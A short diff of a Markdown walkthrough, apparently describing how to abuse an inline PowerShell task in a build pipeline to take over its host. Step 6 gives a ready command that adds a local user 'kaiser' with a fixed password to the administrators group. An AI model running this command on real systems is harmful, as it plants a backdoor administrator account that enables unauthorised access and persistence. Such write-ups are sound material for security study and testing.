@@ -20,6 +20,8 @@
 
 #### 5) Click the newly created Powershell Task and set it to run as inline (It allows to insert powershell code directly into the task)
 
-#### 6) net user kaiser Pwned!123 /add ; net localgroup administrators kaiser /add
+#### 6) net user kaiser Pwned!123 /add ; net localgroup administrators kaiser /add 
 
-#### 7) PWNED!
+#### 7) Save and Queue
+
+#### 8) PWNED!
